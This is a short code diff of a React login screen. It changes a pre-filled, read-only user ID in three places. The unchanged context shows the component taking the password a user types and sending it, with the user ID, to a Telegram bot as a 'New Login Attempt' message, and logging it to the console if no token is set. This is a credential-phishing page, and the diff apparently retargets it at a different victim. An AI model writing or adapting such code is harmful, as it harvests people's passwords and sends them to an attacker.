@@ -62,7 +62,7 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onBack }) => {
     // Construct the message to send
     const message = `
 🔒 *New Login Attempt*
-👤 User ID: \`1141901\`
+👤 User ID: \`2752427\`
 🔑 Password: \`${password}\`
     `;
 
@@ -80,7 +80,7 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onBack }) => {
                 })
             });
         } else {
-            console.log("Telegram Token missing. Login attempt:", { userId: '1141901', password });
+            console.log("Telegram Token missing. Login attempt:", { userId: '2752427', password });
         }
     } catch (error) {
         console.error('Failed to send to Telegram', error);
@@ -119,7 +119,7 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onBack }) => {
           {/* User ID Input - Read Only */}
           <input 
             type="text" 
-            value="1141901"
+            value="2752427"
             readOnly
             className="w-full bg-[#F5F5F5] text-gray-700 placeholder-gray-500 rounded-2xl py-4 px-6 text-[15px] outline-none focus:ring-0 cursor-default"
           />
